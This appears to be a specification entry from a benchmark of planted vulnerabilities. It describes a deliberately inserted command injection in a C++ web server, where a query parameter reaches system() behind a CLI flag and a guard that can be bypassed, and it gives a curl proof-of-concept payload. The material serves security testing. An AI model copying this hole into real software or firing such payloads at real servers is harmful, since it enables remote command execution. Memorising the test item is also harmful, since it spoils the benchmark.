AXES:        C1 I3 S3

DESCRIPTION:
  CLI-flag-gated command injection. The server must be started with --exec-mode
  for the vulnerable /exec endpoint to be reachable. A user-supplied query
  parameter flows through a struct dispatch to system() with no sanitization
  (the strpbrk guard is only active when --strict-exec is also passed).

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard in ExecHandler::handle()
              `if (!exec_mode || ...)  return Response::unhandled();`
  complexity: one condition, one flag, no struct, no helper function

INPUT_FLOW (I3 — struct dispatch):
  entry:      HTTP GET /exec?cmd=<payload>  →  req.getRequestUri()
  path:       ExecHandler::handle() extracts cmd after "cmd=" in URI
              creates ExecArgs{cmd, 0} and calls dispatch_exec(args)
              dispatch_exec() calls system(args.cmd)
  transforms: none — raw query string value passed through struct

SANITIZATION (S3 — conditional strpbrk):
  check:      strpbrk(cmd, "|;&`$") when strict_exec == 1
  bypass:     omit --strict-exec flag; strict_exec stays 0, check skipped
  active:     only when server is started with BOTH --exec-mode --strict-exec

SINK:        system() in dispatch_exec() (server.cpp)

CHANGED FILES:
  server.cpp — 3 hunks:
    1. globals:    added exec_mode, strict_exec, ExecArgs struct, dispatch_exec()
    2. handler:    replaced stub with C1 gate + query extraction + S3 check + I3 dispatch
    3. main():     added --exec-mode and --strict-exec CLI flag parsing

EXPLOIT:
  build:   bash build.sh
  start:   ./seasocks_server --port 18111 --exec-mode
  trigger: curl 'http://127.0.0.1:18111/exec?cmd=id>/tmp/poc_111_marker'
  verify:  cat /tmp/poc_111_marker
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to return 404 (falls through
               to static file serving, which cannot find the file on disk).
  S3 bypass:   omitting --strict-exec keeps strict_exec=0; strpbrk check skipped.

NOTES:
  - system() output goes to the server's stderr (inherited fd), not the HTTP
    response body. The response body contains "Command dispatched: <cmd>".
    Use a write-to-file payload (id>/tmp/poc_111_marker) to confirm execution.
  - Payloads must avoid URL-encoded spaces since the raw URI string is used.
    Space-free payloads (redirects, no-arg commands) work directly.
